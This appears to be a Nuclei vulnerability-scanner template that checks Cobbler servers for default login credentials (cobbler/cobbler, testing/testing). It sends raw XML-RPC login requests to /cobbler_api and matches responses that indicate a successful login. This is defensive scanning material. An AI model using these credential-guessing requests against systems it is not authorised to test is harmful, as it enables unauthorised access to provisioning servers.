http:
- attack: pitchfork
  matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/xml
  - condition: or
    dsl:
    - '!contains(tolower(body), ''<name>faultCode</name>'')'
    - '!contains(tolower(body), ''login failed'')'
    type: dsl
  - part: body
    regex:
    - (.*[a-zA-Z0-9].+==)</string></value>
    type: regex
  matchers-condition: and
  payloads:
    password:
    - cobbler
    - testing
    username:
    - cobbler
    - testing
  raw:
  - "POST {{BaseURL}}/cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\n<?xml\
    \ version='1.0'?>\n<methodCall>\n  <methodName>login</methodName>\n  <params>\n\
    \    <param>\n      <value>\n        <string>{{username}}</string>\n      </value>\n\
    \    </param>\n    <param>\n      <value>\n        <string>{{password}}</string>\n\
    \      </value>\n    </param>\n  </params>\n</methodCall>\n"
id: cobbler-default-login
info:
  author: c-sh0
  classification:
    cwe-id: CWE-798
  description: Cobbler default login credentials for the testing module (testing/testing)
    were discovered.
  metadata:
    max-request: 2
  name: Cobbler Default Login
  reference:
  - https://seclists.org/oss-sec/2022/q1/146
  - https://github.com/cobbler/cobbler/issues/2307
  - https://github.com/cobbler/cobbler/issues/2909
  severity: high
  tags: cobbler,default-login,api,seclists
